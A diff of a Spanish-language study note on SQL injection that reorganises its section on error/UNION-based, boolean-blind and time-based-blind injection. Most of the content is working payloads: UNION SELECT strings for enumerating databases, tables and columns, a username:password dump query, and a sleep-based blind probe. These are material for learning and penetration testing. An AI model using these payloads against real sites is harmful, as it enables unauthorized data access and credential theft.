@@ -78,6 +78,48 @@ admin' UNION SELECT 1,2,3,4,5,6,7-- -
 Esto le permite ver en qué parte de la pantalla aparecen esos números (1, 2, 3...) y luego reemplazar, por ejemplo, el número 5 por version() o user() para empezar a extraer información real del sistema.
 
 
+## Como identificar que tipo de SQL Injection es
+
+Hay 3 tipos de SQL Injection:
+1. Error-Based & UNION-Based
+2. Boolean-Based Blind
+3. Time-Based Blind
+
+
+### 1. Error-Based & UNION-Based
+
+Se usa cuando podés ver la respuesta de la base de datos reflejada en la pantalla.
+
+> [!example] Ejemplos de Inyección (Parámetro GET)
+> 
+> - **Sacar DBs:** `?id=12232' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -`
+>     
+> - **Sacar Tablas:** `?id=12232' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='hack'-- -`
+>     
+> - **Sacar Columnas:** `?id=12232' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='hack' AND table_name='users'-- -`
+>     
+
+### 2. Boolean-Based Blind
+
+Se usa cuando vas a ciegas. La web no te muestra errores, pero cambia su comportamiento (ej. muestra "Usuario encontrado" vs "No encontrado") según si la consulta es _True_ o _False_.
+
+```sql
+-- Pregunta: ¿El primer carácter del firstname del usuario 1 es la letra 'a' (ascii 97)?
+SELECT (SELECT ascii(substring(firstname,1,1)) FROM scientist WHERE id=1)=97;
+-- Devuelve 1 (True) o 0 (False)
+```
+
+### 3. Time-Based Blind
+Se utiliza cuando la web es estática y no cambia en nada (se dice tambien que es ciega). Le pedimos a la base de datos que "espere" (`sleep`) si acertamos la condición.
+
+> [!warning] OJO
+> 
+> Para que el `sleep` se ejecute, a veces la consulta original debe ser verdadera (ej: usar un `id` que exista).
+
+```sql
+?id=1' AND IF(ascii(substr(database(),1,1))=104, sleep(3), 1)-- -
+```
+
 
 ### Identificar la Base de Datos Actual
 
@@ -142,40 +184,7 @@ SELECT group_concat(username,0x3a,password) FROM pokermax_admin
 
 ## 💥 Tipos de Inyección y Ejemplos Prácticos
 
-### 1. Error-Based & UNION-Based
 
-Se usa cuando podés ver la respuesta de la base de datos reflejada en la pantalla.
-
-> [!example] Ejemplos de Inyección (Parámetro GET)
-> 
-> - **Sacar DBs:** `?id=12232' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -`
->     
-> - **Sacar Tablas:** `?id=12232' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='hack'-- -`
->     
-> - **Sacar Columnas:** `?id=12232' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='hack' AND table_name='users'-- -`
->     
-
-### 2. Boolean-Based Blind
-
-Se usa cuando vas a ciegas. La web no te muestra errores, pero cambia su comportamiento (ej. muestra "Usuario encontrado" vs "No encontrado") según si la consulta es _True_ o _False_.
-
-```sql
--- Pregunta: ¿El primer carácter del firstname del usuario 1 es la letra 'a' (ascii 97)?
-SELECT (SELECT ascii(substring(firstname,1,1)) FROM scientist WHERE id=1)=97;
--- Devuelve 1 (True) o 0 (False)
-```
-
-### 3. Time-Based Blind
-
-La web es estática y no cambia en nada. Le pedimos a la base de datos que "espere" (`sleep`) si acertamos la condición.
-
-> [!warning] OJO
-> 
-> Para que el `sleep` se ejecute, a veces la consulta original debe ser verdadera (ej: usar un `id` que exista).
-
-```sql
-?id=1' AND IF(ascii(substr(database(),1,1))=104, sleep(3), 1)-- -
-```
 
 ---
 
